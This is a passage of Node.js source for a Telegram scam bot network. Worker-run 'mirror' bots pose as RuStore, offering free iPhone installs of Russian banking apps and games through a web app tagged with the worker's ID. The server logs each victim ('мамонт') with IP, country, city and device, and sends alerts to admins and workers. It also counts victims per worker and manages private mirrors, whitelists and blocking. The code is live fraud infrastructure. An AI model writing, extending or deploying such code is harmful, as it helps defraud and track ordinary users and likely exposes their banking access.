                if (!mySessionId || !chatSessions[mySessionId]) break;
                await updateTypingPreview(mySessionId, data.text);
                break;
            }
            case 'stop_typing': {
                if (!mySessionId) break;
                clearTimeout(previewUpdateTimers[mySessionId]);
                await clearTypingPreview(mySessionId, data.text);
                break;
            }
        }
    });

    ws.on('close', () => {
        if (mySessionId && chatSessions[mySessionId]) {
            chatSessions[mySessionId].ws = null;
        }
    });
});


app.use(express.json());

app.post('/api/log', async (req, res) => {
    const { workerId, msg, user_info, action } = req.body;
    if (workerId && workerId !== 'null' && !mirrors[workerId]) {
        return res.send('ignored');
    }
    
    // Stats tracking logic
    let isUnique = true;
    if (workerId && workerId !== 'null') {
        let logStats = {};
        if (fs.existsSync('log_stats.json')) {
            try { logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8')); } catch(e){}
        }
        if (!logStats[workerId]) logStats[workerId] = { unique: 0, users: [] };
        
        const uid = user_info && user_info.id ? user_info.id.toString() : null;
        if (uid) {
            if (logStats[workerId].users.includes(uid)) {
                isUnique = false;
            } else {
                logStats[workerId].users.push(uid);
                logStats[workerId].unique++;
                fs.writeFileSync('log_stats.json', JSON.stringify(logStats, null, 2), 'utf8');
            }
        }
    }

    const username = user_info.username ? '@' + user_info.username : (user_info.id || 'Неизвестно');
    const deviceInfo = user_info.device || 'Неизвестно';
    const ip = user_info.ip || 'Неизвестно';
    const country = user_info.country || 'Неизвестно';
    const city = user_info.city || 'Неизвестно';
    
    let workerUsername = workerId;
    let isPriv = false;
    if (workerId === 'null' || !workerId) {
        workerUsername = 'Нет';
    } else if (mirrors[workerId] && mirrors[workerId].username && mirrors[workerId].isPrivate) {
        workerUsername = mirrors[workerId].username;
        isPriv = true;
    } else if (mirrors[workerId] && mirrors[workerId].username) {
        workerUsername = `@${mirrors[workerId].username} (ID: ${workerId})`;
    } else {
        try {
            const chat = await bot.telegram.getChat(workerId);
            if (chat.username) {
                workerUsername = `@${chat.username} (ID: ${workerId})`;
                if (mirrors[workerId]) {
                    mirrors[workerId].username = chat.username;
                    saveMirrors();
                }
            } else {
                workerUsername = `<a href="tg://user?id=${workerId}">${chat.first_name || 'Без имени'}</a> (ID: ${workerId})`;
            }
        } catch (e) {
            if (!isNaN(workerId)) {
                workerUsername = `<a href="tg://user?id=${workerId}">Профиль</a> (ID: ${workerId})`;
            }
        }
    }
    const botUsername = (mirrors[workerId] && mirrors[workerId].botUsername) ? '@' + mirrors[workerId].botUsername : 'Основной бот';
    
    let adminMsg = `🚨 <b>Новое действие мамонта!</b>\n\n👤 <b>Мамонт:</b> ${username}\n🎯 <b>Действие:</b> ${action}\n\n🌍 <b>Гео:</b> ${country}, ${city}\n🌐 <b>IP:</b> ${ip}\n💻 <b>Устройство:</b> ${deviceInfo}\n\n🪞 <b>Зеркало:</b> ${botUsername}\n💼 <b>Воркер:</b> ${workerUsername}`;
    if (msg) adminMsg += `\n\n💬 <i>${msg}</i>`;
    
    const mammothId = user_info.id || user_info.username;
    let keyboard = undefined;
    if (mammothId) {
        keyboard = {
            inline_keyboard: [
                [{ text: '🚫 Заблокировать', callback_data: `block_user_${mammothId}` }]
            ]
        };
    }

    const time = new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' });
    let workerMsg = `🪞 Новый визит на твоё зеркало!\n\n`;
    if (isPriv) {
        workerMsg += `💼 Воркер: ${workerUsername}\n`;
    } else {
        workerMsg += `🔑 ID зеркала: ${workerId}\n`;
    }
    workerMsg += `👤 Кто: ${username}\n🌐 IP: ${ip}\n🌍 Страна: ${country}\n🏙 Город: ${city}\n💻 Устройство: 📱 ${deviceInfo}\n⏰ Время: ${time}\n\n🎯 Действие: ${action}`;
    
    if (isPriv) {
        // 1. Send adminMsg to the owner of the private mirror
        await bot.telegram.sendMessage(mirrors[workerId].ownerChatId, adminMsg, { parse_mode: 'HTML', reply_markup: keyboard }).catch(()=>{});
        
        // Send to main creator as well if they are not the owner
        if (mirrors[workerId].ownerChatId !== adminChatId) {
            await bot.telegram.sendMessage(adminChatId, `👁 <b>[ПРИВАТНОЕ ЗЕРКАЛО]</b>\n` + adminMsg, { parse_mode: 'HTML', reply_markup: keyboard }).catch(()=>{});
        }
        
        // 2. If logBotToken exists, send workerMsg to the owner via log bot
        if (mirrors[workerId].logBotToken) {
            try {
                const logBot = new Telegraf(mirrors[workerId].logBotToken);
                await logBot.telegram.sendMessage(mirrors[workerId].ownerChatId, workerMsg).catch(()=>{});
            } catch (e) { }
        }
    } else {
        // Send to all admins
        await notifyAllAdmins(adminMsg, { parse_mode: 'HTML', reply_markup: keyboard });
        
        // Send to worker
        if (workerId && workerId !== 'null') {
            try {
                await bot.telegram.sendMessage(workerId, workerMsg).catch(()=>{});
            } catch(e) {}
        }
    }
    res.send('ok');
});

let runningMirrors = {};
function startMirror(workerId, token, botUsername) {
    if (runningMirrors[workerId]) return;
    const mirrorBot = new Telegraf(token);
    
    mirrorBot.use(async (ctx, next) => {
        if (ctx.from) {
            if (blockedUsers[ctx.from.id.toString()] || (ctx.from.username && blockedUsers[ctx.from.username])) return;
        }
        return next();
    });

    mirrorBot.start(async (ctx) => {
        const text = `❌ Проблема с установкой приложений на iPhone для работы и повседневной жизни?\n\n🎁 Ничего страшного, ведь наш сервис бесплатно помогает устанавливать все это!\n\n📱 Доступные приложения и игры:\n🏦 Сбербанк, Тинькофф, Альфа Банк и другие банки\n🎮 Toca Boca, Minecraft и еще множество игр!\n👑 CapCut Pro, Picsart Gold\n✨ И многое другое!`;
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL + '?worker=' + workerId + '&v=' + Date.now())],
            [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
        ]);
        try {
            await ctx.replyWithPhoto({ source: 'start_image.jpg' }, { caption: text, parse_mode: 'HTML', reply_markup: keyboard.reply_markup });
        } catch (e) {
            await ctx.reply(text, keyboard);
        }
    });

    mirrorBot.launch().then(() => {
        mirrorBot.telegram.setChatMenuButton({
            menu_button: { type: 'web_app', text: 'RuStore', web_app: { url: WEBAPP_URL + '?worker=' + workerId + '&v=' + Date.now() } }
        }).catch(() => {});
    }).catch(e => console.error("Mirror launch error:", e));
    
    runningMirrors[workerId] = mirrorBot;
}
for (let wid in mirrors) {
    startMirror(wid, mirrors[wid].token, mirrors[wid].botUsername);
}

combinedServer.listen(8080, () => console.log('Static + WebSocket server running on port 8080'));



bot.action('worker_mirror', (ctx) => {
    if (globalSettings.mirrorsEnabled === false) {
        if (!globalSettings.mirrorWhitelist || !globalSettings.mirrorWhitelist.includes(ctx.chat.id.toString())) return ctx.reply("❌ Создание зеркал сейчас закрыто администрацией.");
    }
    if (mirrors[ctx.chat.id]) {
        let logStats = {};
        if (fs.existsSync('log_stats.json')) {
            try { logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8')); } catch(e){}
        }
        const stats = logStats[ctx.chat.id.toString()] || { unique: 0 };
        return ctx.reply(`У вас 1 зеркало: @${mirrors[ctx.chat.id].botUsername}\n📊 Уникальных логов (мамонтов): ${stats.unique}`, Markup.inlineKeyboard([[Markup.button.callback('🗑 Удалить зеркало', 'delete_my_mirror')]]));
    }
    userState[ctx.chat.id] = { step: 'mirror_token' };
    ctx.reply("Отправьте токен вашего бота (от @BotFather):", Markup.inlineKeyboard([[Markup.button.callback('❌ Отмена', 'cancel_mirror_token')]]));
});

bot.action('cancel_mirror_token', (ctx) => {
    delete userState[ctx.chat.id];
    ctx.answerCbQuery("Отменено.");
    sendMainMenu(ctx);
});
bot.action('delete_my_mirror', (ctx) => {
    const k = ctx.chat.id.toString();
    if (runningMirrors[k]) { runningMirrors[k].stop(); delete runningMirrors[k]; }
    delete mirrors[k];
    saveMirrors();
    if (fs.existsSync('log_stats.json')) {
        try {
            let logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8'));
            if (logStats[k]) {
                delete logStats[k];
                fs.writeFileSync('log_stats.json', JSON.stringify(logStats, null, 2), 'utf8');
            }
        } catch(e){}
    }
    ctx.reply("Ваше зеркало удалено!");
});
bot.action('manage_admins', (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_CHAT_ID_LEGACY) return;
    const msg = "👮 **Управление админами**\nТекущие админы: " + admins.join(', ');
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard([[Markup.button.callback('➕ Добавить админа', 'add_admin')], [Markup.button.callback('➖ Удалить админа', 'remove_admin')], [Markup.button.callback('🔙 Назад', 'back_start')]]).reply_markup });
});
bot.action('add_admin', (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_CHAT_ID_LEGACY) return;
    userState[ctx.chat.id] = { step: 'input_add_admin' };
    ctx.reply("Введите Chat ID нового администратора:");
});
bot.action('remove_admin', (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_CHAT_ID_LEGACY) return;
    userState[ctx.chat.id] = { step: 'input_remove_admin' };
    ctx.reply("Введите Chat ID администратора для удаления:");
});
bot.action('my_private_mirrors', (ctx) => {
    if (ctx.chat.id.toString() !== ADMIN_CHAT_ID_LEGACY) return;
    
    const keys = Object.keys(mirrors).filter(k => mirrors[k].isPrivate && mirrors[k].ownerChatId === ctx.chat.id.toString());
    const buttons = [];
    keys.forEach(k => {
        const m = mirrors[k];
        let title = m.username ? `@${m.username}` : `ID: ${k}`;
        if (m.logBotToken) title += ' [С лог-ботом]';
        buttons.push([Markup.button.callback(title, `view_private_mirror_${k}`)]);
    });
    buttons.push([Markup.button.callback('➕ Создать приватное зеркало', 'add_private_mirror')]);
    buttons.push([Markup.button.callback('🔙 Назад', 'back_start')]);
    
    const msg = `💎 **Мои приватные зеркала**\n\nВсего: ${keys.length}\nВыберите зеркало для управления или создайте новое.`;
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard(buttons).reply_markup }).catch(()=>{});
});

bot.action(/view_private_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    const m = mirrors[k];
    if (!m || !m.isPrivate || m.ownerChatId !== ctx.chat.id.toString()) return ctx.answerCbQuery("Зеркало не найдено.");
    
    let msg = `💎 **Приватное зеркало**\n\n`;
    msg += `Юзернейм воркера: ${m.username ? '@'+m.username : 'Нет'}\n`;
    msg += `Бот зеркала: @${m.botUsername}\n`;
    msg += `Лог-бот подключен: ${m.logBotToken ? '✅ Да' : '❌ Нет'}\n`;
    
    const buttons = [
        [Markup.button.callback(m.logBotToken ? '⚙️ Изменить лог-бота' : '➕ Добавить лог-бота', `edit_log_bot_${k}`)],
        [Markup.button.callback('🗑 Удалить приватное зеркало', `delete_mirror_${k}`)],
        [Markup.button.callback('🔙 К списку', 'my_private_mirrors')]
    ];
    
    if (m.logBotToken) {
        buttons.splice(1, 0, [Markup.button.callback('❌ Удалить лог-бота', `remove_log_bot_${k}`)]);
    }
    
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard(buttons).reply_markup }).catch(()=>{});
});

bot.action(/remove_log_bot_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (mirrors[k]) {
        delete mirrors[k].logBotToken;
        saveMirrors();
    }
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: `view_private_mirror_${k}` } });
});

bot.action(/edit_log_bot_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    userState[ctx.chat.id] = { step: 'edit_private_log_bot', mirrorId: k };
    ctx.reply("Отправьте токен нового бота для логов:\n\nЭтот бот будет использоваться ТОЛЬКО для отправки вам уведомлений (он не будет отвечать пользователям).", Markup.inlineKeyboard([[{text: '❌ Отмена', callback_data: `view_private_mirror_${k}`}]]));
});

bot.action('manage_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    
    let visibleCount = 0;
    Object.keys(mirrors).forEach(k => {
        const m = mirrors[k];
        if (m.isPrivate && m.ownerChatId !== ctx.chat.id.toString()) return;
        visibleCount++;
    });
    
    const msg = "🪞 **Управление зеркалами**\n\nВсего зеркал: " + visibleCount + "\nДоступ: " + (globalSettings.mirrorsEnabled === false ? "Только Whitelist" : "Открыт всем");
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard([[Markup.button.callback(globalSettings.mirrorsEnabled === false ? '🔓 Открыть для всех' : '🔒 Закрыть (Whitelist)', 'toggle_mirrors')], [Markup.button.callback('➕ Добавить в Whitelist', 'add_whitelist')], [Markup.button.callback('📋 Список зеркал', 'list_mirrors')], [Markup.button.callback('🔙 Назад', 'back_start')]]).reply_markup });
});
bot.action('toggle_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    globalSettings.mirrorsEnabled = (globalSettings.mirrorsEnabled === false) ? true : false;
    saveSettings();
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'manage_mirrors' } });
});
bot.action('add_whitelist', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    userState[ctx.chat.id] = { step: 'input_whitelist' };
    ctx.reply("Введите Chat ID воркера для выдачи доступа:");
});
bot.action('list_mirrors', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const keys = Object.keys(mirrors);
    if (keys.length === 0) return ctx.reply("Зеркал пока нет.");
    const buttons = [];
    keys.forEach(k => {
        const m = mirrors[k];
        if (m.isPrivate && m.ownerChatId !== ctx.chat.id.toString()) return;
        
        let title = m.username ? `@${m.username}` : `ID: ${k}`;
        if (m.isPrivate) title += ' [Приватное]';
        buttons.push([Markup.button.callback(`@${m.botUsername} (${title})`, `view_mirror_${k}`)]);
    });
    if (buttons.length === 0) return ctx.reply("Доступных зеркал пока нет.");
    ctx.editMessageText("📋 **Список зеркал:**", { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } });
});
bot.action(/view_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1]; const m = mirrors[k];
    if (!m) return ctx.reply("Зеркало не найдено.");
    const workerName = m.username ? `@${m.username}` : `Без username`;
    
    let logStats = {};
    if (fs.existsSync('log_stats.json')) {
        try { logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8')); } catch(e){}
    }
    const stats = logStats[k] || { unique: 0 };
    
    const msg = `🪞 Зеркало: @${m.botUsername}\n👤 Воркер: ${workerName} (ID: ${k})\n📊 Уникальных логов: ${stats.unique}\n🛠 Права на свои приложения: ${m.canAddApps ? '✅ Да' : '❌ Нет'}`;
    ctx.editMessageText(msg, { reply_markup: Markup.inlineKeyboard([[Markup.button.callback(m.canAddApps ? '❌ Забрать права' : '✅ Выдать права', `toggle_app_rights_${k}`)], [Markup.button.callback('🗑 Удалить зеркало', `delete_mirror_${k}`)], [Markup.button.callback('🔙 К списку', 'list_mirrors')]]).reply_markup });
});
bot.action(/toggle_app_rights_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (mirrors[k]) {
        mirrors[k].canAddApps = !mirrors[k].canAddApps;
        saveMirrors();
        if (mirrors[k].canAddApps) {
            bot.telegram.sendMessage(k, "✅ Администратор выдал вам права на добавление собственных приложений в ваше зеркало! Нажмите /start и перейдите в меню.").catch(()=>{});
        } else {
            bot.telegram.sendMessage(k, "❌ Администратор забрал у вас права на добавление собственных приложений.").catch(()=>{});
        }
    }
    // Update view manually
    const m = mirrors[k];
    if (m) {
        let logStats = {};
        if (fs.existsSync('log_stats.json')) {
            try { logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8')); } catch(e){}
        }
        const stats = logStats[k] || { unique: 0 };
        const workerName = m.username ? `@${m.username}` : `Без username`;
        const msg = `🪞 Зеркало: @${m.botUsername}\n👤 Воркер: ${workerName} (ID: ${k})\n📊 Уникальных логов: ${stats.unique}\n🛠 Права на свои приложения: ${m.canAddApps ? '✅ Да' : '❌ Нет'}`;
        ctx.editMessageText(msg, { reply_markup: Markup.inlineKeyboard([[Markup.button.callback(m.canAddApps ? '❌ Забрать права' : '✅ Выдать права', `toggle_app_rights_${k}`)], [Markup.button.callback('🗑 Удалить зеркало', `delete_mirror_${k}`)], [Markup.button.callback('🔙 К списку', 'list_mirrors')]]).reply_markup }).catch(()=>{});
    }
    ctx.answerCbQuery();
});
bot.action(/delete_mirror_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return;
    const k = ctx.match[1];
    if (runningMirrors[k]) { runningMirrors[k].stop(); delete runningMirrors[k]; }
    delete mirrors[k]; saveMirrors();
    if (fs.existsSync('log_stats.json')) {
        try {
            let logStats = JSON.parse(fs.readFileSync('log_stats.json', 'utf8'));
            if (logStats[k]) {
                delete logStats[k];
                fs.writeFileSync('log_stats.json', JSON.stringify(logStats, null, 2), 'utf8');
            }
        } catch(e){}
    }
    ctx.answerCbQuery("Зеркало удалено!");
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'list_mirrors' } });
});

bot.action(/block_user_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return ctx.answerCbQuery("Отказано в доступе");
    const mammothId = ctx.match[1];
    blockedUsers[mammothId] = true;
    saveBlockedUsers();
    ctx.answerCbQuery("🚫 Пользователь заблокирован!");
});

bot.action(/unblock_user_(.+)/, (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return ctx.answerCbQuery("Отказано в доступе");
    const mammothId = ctx.match[1];
    delete blockedUsers[mammothId];
    saveBlockedUsers();
    ctx.answerCbQuery("✅ Пользователь разблокирован!");
    bot.handleUpdate({ callback_query: { id: ctx.callbackQuery.id, from: ctx.from, message: ctx.callbackQuery.message, chat_instance: ctx.callbackQuery.chat_instance, data: 'blocked_users' } });
});

bot.action('blocked_users', (ctx) => {
    if (!admins.includes(ctx.chat.id.toString())) return ctx.answerCbQuery("Отказано в доступе");
    const keys = Object.keys(blockedUsers);
    if (keys.length === 0) {
        return ctx.editMessageText("Заблокированных пользователей нет.", { reply_markup: Markup.inlineKeyboard([[Markup.button.callback('🔙 Назад', 'back_start')]]).reply_markup });
    }
    let msg = "🚫 **Заблокированные мамонты**:\n\n";
    const buttons = keys.map(k => [Markup.button.callback(`✅ Разблокировать ${k}`, `unblock_user_${k}`)]);
    buttons.push([Markup.button.callback('🔙 Назад', 'back_start')]);
    ctx.editMessageText(msg, { parse_mode: 'Markdown', reply_markup: Markup.inlineKeyboard(buttons).reply_markup });
});

bot.launch().then(() => console.log('Telegraf bot is running...'));


